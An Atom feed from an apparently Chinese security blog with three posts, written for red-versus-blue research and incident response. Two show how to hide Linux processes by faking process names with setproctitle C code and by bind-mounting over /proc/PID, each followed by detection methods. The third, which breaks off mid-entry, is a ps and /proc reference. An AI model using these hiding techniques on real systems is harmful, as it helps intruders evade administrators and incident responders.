<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>x7peeps</title>
  
  <subtitle>subtitle</subtitle>
  <link href="https://xtpeeps.cn/atom.xml" rel="self"/>
  
  <link href="https://xtpeeps.cn/"/>
  <updated>2021-06-17T14:30:17.862Z</updated>
  <id>https://xtpeeps.cn/</id>
  
  <author>
    <name>x7</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/06/17/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E8%BF%9B%E7%A8%8B%E5%90%8D%E4%BC%AA%E9%80%A0/"/>
    <id>https://xtpeeps.cn/2021/06/17/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E8%BF%9B%E7%A8%8B%E5%90%8D%E4%BC%AA%E9%80%A0/</id>
    <published>2021-06-17T02:32:13.602Z</published>
    <updated>2021-06-17T14:30:17.862Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>分子实验室 <a href="https://molecule-labs.com/">https://molecule-labs.com/</a></p></blockquote><h3 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h3><p>在测试系统命令对linux隐藏进程的有效性测试，记录的相关知识点。</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>在恶意代码中通过设置具有迷惑性的进程名字，以达到躲避管理员检查的目的</p><h3 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h3><p>ubuntu</p><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>这里我们参考：linux 修改进程名称的方法伪造进程 <a href="https://www.jb51.net/article/70306.htm%EF%BC%8C%E6%8E%92%E5%9D%91%E6%97%B6%E6%B3%A8%E6%84%8F%E6%B7%BB%E5%8A%A0%E5%A3%B0%E6%98%8E%E5%8D%B3%E5%8F%AF%E3%80%82">https://www.jb51.net/article/70306.htm，排坑时注意添加声明即可。</a></p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &quot;./util/setproctitle.c&quot;# --这里需要注意规避报错--# 原版这里我测试的时候报错，需要加上下面的函数引用#ifdef _WIN32#include &lt;Windows.h&gt;#else#include &lt;unistd.h&gt;#endif# --引用完毕--// extern char **environ;// int main(int argc , char *argv[])// &#123;// int i;// printf(&quot;argc:%d\n&quot; , argc);// for (i = 0; i &lt; argc; ++i)&#123;// printf(&quot;0x%x\n&quot; , argv[i]);// printf(&quot;argv[%d]:%s\n&quot; , i , argv[i]);// &#125;// printf(&quot;evriron=%x\n&quot; , environ[0]);// return 0;// &#125;int main(int argc, char **argv)&#123; spt_init(argc,argv); setproctitle(&quot;设置进程名为:this is a test&quot;); sleep(1000); return 0;&#125;</code></pre><p>setproctitle.c（这个不变）文件如下：</p><pre><code>/* ========================================================================== * setproctitle.c - Linux/Darwin setproctitle. * -------------------------------------------------------------------------- * Copyright (C) 2010 William Ahern * Copyright (C) 2013 Salvatore Sanfilippo * Copyright (C) 2013 Stam He * * Permission is hereby granted, free of charge, to any person obtaining a * copy of this software and associated documentation files (the * &quot;Software&quot;), to deal in the Software without restriction, including * without limitation the rights to use, copy, modify, merge, publish, * distribute, sublicense, and/or sell copies of the Software, and to permit * persons to whom the Software is furnished to do so, subject to the * following conditions: * * The above copyright notice and this permission notice shall be included * in all copies or substantial portions of the Software. * * THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN * NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, * DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR * OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE * USE OR OTHER DEALINGS IN THE SOFTWARE. * ========================================================================== */#ifndef _GNU_SOURCE#define _GNU_SOURCE#endif #include &lt;stddef.h&gt;  /* NULL size_t */#include &lt;stdarg.h&gt;  /* va_list va_start va_end */#include &lt;stdlib.h&gt;  /* malloc(3) setenv(3) clearenv(3) setproctitle(3) getprogname(3) */#include &lt;stdio.h&gt;  /* vsnprintf(3) snprintf(3) */#include &lt;string.h&gt;  /* strlen(3) strchr(3) strdup(3) memset(3) memcpy(3) */#include &lt;errno.h&gt;  /* errno program_invocation_name program_invocation_short_name */#if !defined(HAVE_SETPROCTITLE)#define HAVE_SETPROCTITLE (defined __NetBSD__ || defined __FreeBSD__ || defined __OpenBSD__)#endif#if !HAVE_SETPROCTITLE#if (defined __linux || defined __APPLE__)extern char **environ;static struct &#123;  /* original value */  const char *arg0;  /* title space available */  char *base, *end;   /* pointer to original nul character within base */  char *nul;  _Bool reset;  int error;&#125; SPT;#ifndef SPT_MIN#define SPT_MIN(a, b) (((a) &lt; (b))? (a) : (b))#endifstatic inline size_t spt_min(size_t a, size_t b);static int spt_clearenv(void);static int spt_copyenv(char *oldenv[]);static int spt_copyargs(int argc, char *argv[]) ;void spt_init(int argc, char *argv[]);void setproctitle(const char *fmt, ...);static inline size_t spt_min(size_t a, size_t b) &#123;  return SPT_MIN(a, b);&#125; /* spt_min() *//* * For discussion on the portability of the various methods, see * http://lists.freebsd.org/pipermail/freebsd-stable/2008-June/043136.html */static int spt_clearenv(void) &#123;#if __GLIBC__  clearenv();  return 0;#else  extern char **environ;  static char **tmp;  if (!(tmp = malloc(sizeof *tmp)))    return errno;  tmp[0] = NULL;  environ = tmp;  return 0;#endif&#125; /* spt_clearenv() */static int spt_copyenv(char *oldenv[]) &#123;  extern char **environ;  char *eq;  int i, error;  if (environ != oldenv)    return 0;  if ((error = spt_clearenv()))    goto error;  for (i = 0; oldenv[i]; i++) &#123;    if (!(eq = strchr(oldenv[i], &#39;=&#39;)))      continue;    *eq = &#39;\0&#39;;    error = (0 != setenv(oldenv[i], eq + 1, 1))? errno : 0;    *eq = &#39;=&#39;;    if (error)      goto error;  &#125;  return 0;error:  environ = oldenv;  return error;&#125; /* spt_copyenv() */static int spt_copyargs(int argc, char *argv[]) &#123;  char *tmp;  int i;  for (i = 1; i &lt; argc || (i &gt;= argc &amp;&amp; argv[i]); i++) &#123;    if (!argv[i])      continue;    if (!(tmp = strdup(argv[i])))      return errno;    argv[i] = tmp;  &#125;  return 0;&#125; /* spt_copyargs() */void spt_init(int argc, char *argv[]) &#123;    char **envp = environ;  char *base, *end, *nul, *tmp;  int i, error;  if (!(base = argv[0]))    return;  nul = &amp;base[strlen(base)];  end = nul + 1;  for (i = 0; i &lt; argc || (i &gt;= argc &amp;&amp; argv[i]); i++) &#123;    if (!argv[i] || argv[i] &lt; end)      continue;    end = argv[i] + strlen(argv[i]) + 1;  &#125;  for (i = 0; envp[i]; i++) &#123;    if (envp[i] &lt; end)      continue;    end = envp[i] + strlen(envp[i]) + 1;  &#125;  if (!(SPT.arg0 = strdup(argv[0])))    goto syerr;  if ((error = spt_copyenv(envp)))    goto error;  if ((error = spt_copyargs(argc, argv)))    goto error;  SPT.nul = nul;  SPT.base = base;  SPT.end = end;  return;syerr:  error = errno;error:  SPT.error = error;&#125; /* spt_init() */#ifndef SPT_MAXTITLE#define SPT_MAXTITLE 255#endifvoid setproctitle(const char *fmt, ...) &#123;  char buf[SPT_MAXTITLE + 1]; /* use buffer in case argv[0] is passed */  va_list ap;  char *nul;  int len, error;  if (!SPT.base)    return;  if (fmt) &#123;    va_start(ap, fmt);    len = vsnprintf(buf, sizeof buf, fmt, ap);    va_end(ap);  &#125; else &#123;    len = snprintf(buf, sizeof buf, &quot;%s&quot;, SPT.arg0);  &#125;  if (len &lt;= 0)    &#123; error = errno; goto error; &#125;  if (!SPT.reset) &#123;    memset(SPT.base, 0, SPT.end - SPT.base);    SPT.reset = 1;  &#125; else &#123;    memset(SPT.base, 0, spt_min(sizeof buf, SPT.end - SPT.base));  &#125;  len = spt_min(len, spt_min(sizeof buf, SPT.end - SPT.base) - 1);  memcpy(SPT.base, buf, len);  nul = &amp;SPT.base[len];  if (nul &lt; SPT.nul) &#123;    *SPT.nul = &#39;.&#39;;  &#125; else if (nul == SPT.nul &amp;&amp; &amp;nul[1] &lt; SPT.end) &#123;    *SPT.nul = &#39; &#39;;    *++nul = &#39;\0&#39;;  &#125;  return;error:  SPT.error = error;&#125; /* setproctitle() */#endif /* __linux || __APPLE__ */#endif /* !HAVE_SETPROCTITLE */</code></pre><p>测试修改进程名shell：</p><pre><code>parallels@ubuntu:~/Documents$ gcc -o changepressname changepress.c parallels@ubuntu:~/Documents$ ./changepressname</code></pre><p>ps查询可以看到我们已经修改进程名</p><img src="/2021/06/17/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E8%BF%9B%E7%A8%8B%E5%90%8D%E4%BC%AA%E9%80%A0/1623677841324-2ed15d1e-01df-4406-b5e9-40ed56ddbd33.png" class="" title="image.png"><p>这里攻击的角度，我们就可以集成，并通过指定我们攻击进程进行隐藏。</p><h3 id="防守对抗角度"><a href="#防守对抗角度" class="headerlink" title="防守对抗角度"></a>防守对抗角度</h3><p>从防守角度，测试一下我们应对方法，</p><ol><li>可以看到ll /proc/PID/exe，可以通过对比ps结果名与exe对应进程名审计到异常</li></ol><img src="/2021/06/17/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E8%BF%9B%E7%A8%8B%E5%90%8D%E4%BC%AA%E9%80%A0/1623677852664-5be46575-b005-4f6e-a9c9-16d3e8c4619c.png" class="" title="image.png"><ol start="2"><li>另外一个就是pstree查询，可以看到执行的程序名与ps查询结果无法对应也可以审计到异常</li></ol><p>parallels@ubuntu:~/Documents$ pstree -aphn 24565 </p><p>changepressname,24565 </p><img src="/2021/06/17/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E8%BF%9B%E7%A8%8B%E5%90%8D%E4%BC%AA%E9%80%A0/1623678099892-ad994b9f-395a-414f-bc89-977172e14bcd.png" class="" title="image.png">]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;分子实验室 &lt;a href=&quot;https://molecule-labs.com/&quot;&gt;https://molecule-labs.com/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;背景：&quot;&gt;&lt;a href=&quot;#背景：&quot; clas</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/06/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD%E6%96%B9%E5%BC%8F%E7%A0%94%E7%A9%B6/"/>
    <id>https://xtpeeps.cn/2021/06/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD%E6%96%B9%E5%BC%8F%E7%A0%94%E7%A9%B6/</id>
    <published>2021-06-13T02:17:09.433Z</published>
    <updated>2021-06-17T14:30:29.801Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>分子实验室 <a href="https://molecule-labs.com/">https://molecule-labs.com/</a></p></blockquote><p>最近在精细应急响应相关内容的时候注意到linux进程隐藏确实会是应急响应中的一个问题，因此这里对目录挂载方式的隐藏进程方式进行了实践和查询的对抗了解。</p><h3 id="创建挂载隐藏进程"><a href="#创建挂载隐藏进程" class="headerlink" title="创建挂载隐藏进程"></a>创建挂载隐藏进程</h3><pre><code>方式1mount /dev/sda1 /proc/xxx方式2mount -o bind /empty/dir /porc/xxxx</code></pre><img src="/2021/06/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD%E6%96%B9%E5%BC%8F%E7%A0%94%E7%A9%B6/1622794545400-4223a5f8-f891-4650-a90a-2affabf09157.png" class="" title="image.png"><img src="/2021/06/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD%E6%96%B9%E5%BC%8F%E7%A0%94%E7%A9%B6/1622794898291-0acf7eb6-22ad-493a-a653-1ae5765daf9f.png" class="" title="image.png"><h3 id="查询隐藏挂载目录方式进程的办法"><a href="#查询隐藏挂载目录方式进程的办法" class="headerlink" title="查询隐藏挂载目录方式进程的办法"></a>查询隐藏挂载目录方式进程的办法</h3><p>linux /proc/66003 文件系统内容通过挂载操作已经为空，无法获取细节</p><img src="/2021/06/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD%E6%96%B9%E5%BC%8F%E7%A0%94%E7%A9%B6/1622794903721-735b4b9e-f456-409e-9204-727e9d2f8f4b.png" class="" title="image.png"><p>唯一查看到隐藏进程的办法是通过cat /proc/mounts 查看挂载项中包含/proc/pid</p><img src="/2021/06/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD%E6%96%B9%E5%BC%8F%E7%A0%94%E7%A9%B6/1622794888772-9063872b-562a-480e-ae76-bd7735355c68.png" class="" title="image.png">]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;分子实验室 &lt;a href=&quot;https://molecule-labs.com/&quot;&gt;https://molecule-labs.com/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近在精细应急响应相关内容的时候注意到linux进程隐藏确</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/06/04/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E6%A3%80%E6%9F%A5/"/>
    <id>https://xtpeeps.cn/2021/06/04/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E6%A3%80%E6%9F%A5/</id>
    <published>2021-06-03T19:42:18.070Z</published>
    <updated>2021-06-03T19:42:26.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="linux下系统进程查询"><a href="#linux下系统进程查询" class="headerlink" title="linux下系统进程查询"></a>linux下系统进程查询</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p><a href="https://www.runoob.com/linux/linux-comm-ps.html">https://www.runoob.com/linux/linux-comm-ps.html</a></p><pre><code>Usage: ps [options]参数：ps 的参数非常多, 在此仅列出几个常用的参数并大略介绍含义-A 列出所有的进程-w 显示加宽可以显示较多的资讯-au 显示较详细的资讯-aux 显示所有包含其他使用者的行程au(x) 输出格式 :USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDUSER: 行程拥有者PID: pid%CPU: 占用的 CPU 使用率%MEM: 占用的记忆体使用率VSZ: 占用的虚拟记忆体大小RSS: 占用的记忆体大小TTY: 终端的次要装置号码 (minor device number of tty)STAT: 该行程的状态:D: 无法中断的休眠状态 (通常 IO 的进程)R: 正在执行中S: 静止状态T: 暂停执行Z: 不存在但暂时无法消除W: 没有足够的记忆体分页可分配&lt;: 高优先序的行程N: 低优先序的行程L: 有记忆体分页分配并锁在记忆体内 (实时系统或捱A I/O)START: 行程开始时间TIME: 执行的时间COMMAND:所执行的指令</code></pre><p>使用ps命令，分析进程</p><pre><code>ps aux | grep pid</code></pre><h4 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h4><pre><code>ps -ef //显示所有命令，连带命令行根据netstat定位出的pid.使用ps命令分析进程ps aux | grep pid查看下pid所对应的进程文件路径，netstat -antlp运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号）ps -u root //显示root进程用户信息ps -A </code></pre><pre><code>parallels@parallels-Parallels-Virtual-Platform:~$ ps -efUID          PID    PPID  C STIME TTY          TIME CMDroot           1       0  0 14:03 ?        00:00:02 /sbin/init splashroot           2       0  0 14:03 ?        00:00:00 [kthreadd]root           3       2  0 14:03 ?        00:00:00 [rcu_gp]root           4       2  0 14:03 ?        00:00:00 [rcu_par_gp]root           6       2  0 14:03 ?        00:00:00 [kworker/0:0H-kblockd]root           9       2  0 14:03 ?        00:00:00 [mm_percpu_wq]root          10       2  0 14:03 ?        00:00:00 [ksoftirqd/0]root          11       2  0 14:03 ?        00:00:08 [rcu_sched]root          12       2  0 14:03 ?        00:00:00 [migration/0]root          13       2  0 14:03 ?        00:00:00 [idle_inject/0]root          14       2  0 14:03 ?        00:00:00 [cpuhp/0]root          15       2  0 14:03 ?        00:00:00 [cpuhp/1]root          16       2  0 14:03 ?        00:00:00 [idle_inject/1]root          17       2  0 14:03 ?        00:00:00 [migration/1]root          18       2  0 14:03 ?        00:00:00 [ksoftirqd/1]root          20       2  0 14:03 ?        00:00:00 [kworker/1:0H-kblockd]root          21       2  0 14:03 ?        00:00:00 [kdevtmpfs]root          22       2  0 14:03 ?        00:00:00 [netns]root          23       2  0 14:03 ?        00:00:00 [rcu_tasks_kthre]root          24       2  0 14:03 ?        00:00:00 [kauditd]root          28       2  0 14:03 ?        00:00:00 [khungtaskd]root          29       2  0 14:03 ?        00:00:00 [oom_reaper]root          30       2  0 14:03 ?        00:00:00 [writeback]root          31       2  0 14:03 ?        00:00:00 [kcompactd0]root          32       2  0 14:03 ?        00:00:00 [ksmd]root          33       2  0 14:03 ?        00:00:00 [khugepaged]root         125       2  0 14:03 ?        00:00:00 [kintegrityd]root         126       2  0 14:03 ?        00:00:00 [kblockd]root         127       2  0 14:03 ?        00:00:00 [blkcg_punt_bio]root         128       2  0 14:03 ?        00:00:00 [tpm_dev_wq]root         129       2  0 14:03 ?        00:00:00 [ata_sff]root         130       2  0 14:03 ?        00:00:00 [md]root         131       2  0 14:03 ?        00:00:00 [edac-poller]root         132       2  0 14:03 ?        00:00:00 [devfreq_wq]root         133       2  0 14:03 ?        00:00:00 [watchdogd]root         136       2  0 14:03 ?        00:00:00 [kswapd0]root         269       2  0 14:03 ?        00:00:00 [kworker/0:1H-kblockd]root         272       2  0 14:03 ?        00:00:00 [kworker/1:1H-kblockd]root         292       2  0 14:03 ?        00:00:00 [jbd2/sda5-8]root         293       2  0 14:03 ?        00:00:00 [ext4-rsv-conver]root         332       1  0 14:03 ?        00:00:01 /lib/systemd/systemd-journaldroot         352       1  0 14:03 ?        00:00:01 /lib/systemd/systemd-udevdroot         363       2  0 14:03 ?        00:00:00 [loop0]root         367       2  0 14:03 ?        00:00:00 [loop1]root         369       2  0 14:03 ?        00:00:00 [loop2]root         383       2  0 14:03 ?        00:00:00 [loop3]root         385       2  0 14:03 ?        00:00:00 [loop4]root         392       2  0 14:03 ?        00:00:00 [loop5]root         393       2  0 14:03 ?        00:00:00 [loop6]root         397       2  0 14:03 ?        00:00:00 [loop7]root         399       2  0 14:03 ?        00:00:00 [loop8]root         400       2  0 14:03 ?        00:00:00 [loop9]root         431       2  0 14:03 ?        00:00:00 [cryptd]systemd+     596       1  0 14:03 ?        00:00:00 /lib/systemd/systemd-resolvedsystemd+     597       1  0 14:03 ?        00:00:00 /lib/systemd/systemd-timesyncdroot         628       1  0 14:03 ?        00:00:00 /usr/lib/accountsservice/accounts-daemonroot         629       1  0 14:03 ?        00:00:00 /usr/sbin/acpidavahi        634       1  0 14:03 ?        00:00:14 avahi-daemon: running [parallels-Parallels-Virtroot         636       1  0 14:03 ?        00:00:00 /usr/sbin/cron -froot         638       1  0 14:03 ?        00:00:16 /usr/sbin/cupsd -lmessage+     639       1  0 14:03 ?        00:00:46 /usr/bin/dbus-daemon --system --address=systemdroot         652       1  0 14:03 ?        00:00:00 /usr/sbin/irqbalance --foregroundroot         654       1  0 14:03 ?        00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher -root         658       1  0 14:03 ?        00:00:05 /usr/lib/policykit-1/polkitd --no-debugsyslog       665       1  0 14:03 ?        00:00:00 /usr/sbin/rsyslogd -n -iNONEroot         670       1  0 14:03 ?        00:00:03 /usr/lib/snapd/snapdroot         676       1  0 14:03 ?        00:00:00 /usr/libexec/switcheroo-controlroot         681       1  0 14:03 ?        00:00:00 /lib/systemd/systemd-logindroot         682       1  0 14:03 ?        00:00:01 /usr/sbin/thermald --no-daemon --dbus-enableroot         686       1  0 14:03 ?        00:00:00 /usr/lib/udisks2/udisksdroot         687       1  0 14:03 ?        00:00:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicaavahi        701     634  0 14:03 ?        00:00:00 avahi-daemon: chroot helpercolord       759       1  0 14:03 ?        00:00:00 /usr/libexec/colordroot         771       1  0 14:03 ?        00:00:01 /usr/sbin/cups-browsedroot         786       1  0 14:03 ?        00:00:00 /usr/sbin/ModemManager --filter-policy=strictroot         793       1  0 14:03 ?        00:00:04 /usr/bin/prltoolsd -p /var/run/prltoolsd.pidroot         826       1  0 14:03 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgradeswhoopsie     893       1  0 14:03 ?        00:00:00 /usr/bin/whoopsie -fkernoops     894       1  0 14:03 ?        00:00:00 /usr/sbin/kerneloops --testroot         897     793  0 14:03 ?        00:00:06 prlshprintroot         899     793  0 14:03 ?        00:00:00 prltimesyncroot         900     793  0 14:03 ?        00:00:00 prlusmdkernoops     903       1  0 14:03 ?        00:00:00 /usr/sbin/kerneloopsroot         908       1  0 14:03 ?        00:00:00 /usr/sbin/gdm3rtkit       1208       1  0 14:03 ?        00:00:00 /usr/libexec/rtkit-daemonlp          1335     638  0 14:04 ?        00:00:00 /usr/lib/cups/notifier/dbus dbus://root        1456       1  0 14:04 ?        00:00:01 /usr/lib/upower/upowerdroot        1897     908  0 14:04 ?        00:00:00 gdm-session-worker [pam/gdm-password]paralle+    1971       1  0 14:04 ?        00:00:00 /lib/systemd/systemd --userparalle+    1972    1971  0 14:04 ?        00:00:00 (sd-pam)paralle+    1978    1971  0 14:04 ?        00:00:00 /usr/bin/pulseaudio --daemonize=no --log-targetparalle+    1980    1971  0 14:04 ?        00:00:00 /usr/libexec/tracker-miner-fsparalle+    1982    1971  0 14:04 ?        00:00:10 /usr/bin/dbus-daemon --session --address=systemparalle+    1989       1  0 14:04 ?        00:00:00 /usr/bin/gnome-keyring-daemon --daemonize --logparalle+    2003    1971  0 14:04 ?        00:00:00 /usr/libexec/gvfsdparalle+    2008    1971  0 14:04 ?        00:00:00 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f paralle+    2009    1971  0 14:04 ?        00:00:00 /usr/libexec/gvfs-udisks2-volume-monitorparalle+    2037    1971  0 14:04 ?        00:00:00 /usr/libexec/gvfs-goa-volume-monitorparalle+   27969    3078  0 16:35 pts/0    00:00:00 ps -ef</code></pre><h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>参考：<a href="https://www.cnblogs.com/liushui-sky/p/9354536.html">https://www.cnblogs.com/liushui-sky/p/9354536.html</a></p><p>Linux系统上的/proc目录是一种文件系统，即proc文件系统。</p><p>其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p><p>为了查看及使用上的方便，这些文件通常会按照相关性进行分类存储于不同的目录甚至子目录中，如/proc/scsi目录中存储的就是当前系统上所有SCSI设备的相关信息，/proc/N中存储的则是系统当前正在运行的进程的相关信息，其中N为正在运行的进程（可以想象得到，在某进程结束后其相关目录则会消失）。</p><p>大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。不过，这些可读性较差的文件在使用一些命令如apm、free、lspci或top查看时却可以有着不错的表现。</p><h4 id="查看当前系统进程"><a href="#查看当前系统进程" class="headerlink" title="查看当前系统进程"></a>查看当前系统进程</h4><p>/proc目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进程的进程号，里面包含对应进程相关的多个信息文件。</p><pre><code>ll /proc</code></pre><p>上面列出的是/proc目录中一些进程相关的目录，每个目录中是当程本身相关信息的文件。</p><h4 id="PID-cmdline-（重点）"><a href="#PID-cmdline-（重点）" class="headerlink" title="/PID/cmdline （重点）"></a>/PID/cmdline （重点）</h4><p><strong>cmdline — 启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息</strong></p><p>在启动时传递至内核的相关参数信息，这些信息通常由lilo或grub等启动管理工具进行传递；</p><p>此处这里无法显示通过&amp;&amp;链接的执行的命令行串，无法用来查询由于&amp;&amp;命令行内容</p><pre><code>parallels@parallels-Parallels-Virtual-Platform:~$ cat /proc/47878/cmdline ping baidu.com</code></pre><h4 id="PID-cwd"><a href="#PID-cwd" class="headerlink" title="/PID/cwd"></a>/PID/cwd</h4><p><strong>cwd — 指向当前进程运行目录的一个符号链接</strong></p><pre><code>parallels@parallels-Parallels-Virtual-Platform:~$ sudo ls -l /proc/43828 | grep cwdlrwxrwxrwx 1 root      root      0 May 31 14:10 cwd -&gt; /home/parallels</code></pre><h4 id="PID-environ（重点）"><a href="#PID-environ（重点）" class="headerlink" title="/PID/environ（重点）"></a>/PID/environ（重点）</h4><p>environ — 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示</p><pre><code>parallels@parallels-Parallels-Virtual-Platform:~$ sudo cat /proc/47878/environ [sudo] password for parallels: SHELL=/bin/bashSESSION_MANAGER=local/parallels-Parallels-Virtual-Platform:@/tmp/.ICE-unix/2258,unix/parallels-Parallels-Virtual-Platform:/tmp/.ICE-unix/2258QT_ACCESSIBILITY=1COLORTERM=truecolorXDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdgXDG_MENU_PREFIX=gnome-GNOME_DESKTOP_SESSION_ID=this-is-deprecatedGTK_IM_MODULE=ibusQT4_IM_MODULE=ibusGNOME_SHELL_SESSION_MODE=ubuntuSSH_AUTH_SOCK=/run/user/1000/keyring/sshXMODIFIERS=@im=ibusDESKTOP_SESSION=ubuntuSSH_AGENT_PID=2178GTK_MODULES=gail:atk-bridgePWD=/home/parallelsLOGNAME=parallelsXDG_SESSION_DESKTOP=ubuntuXDG_SESSION_TYPE=x11GPG_AGENT_INFO=/run/user/1000/gnupg/S.gpg-agent:0:1XAUTHORITY=/run/user/1000/gdm/XauthorityGJS_DEBUG_TOPICS=JS ERROR;JS 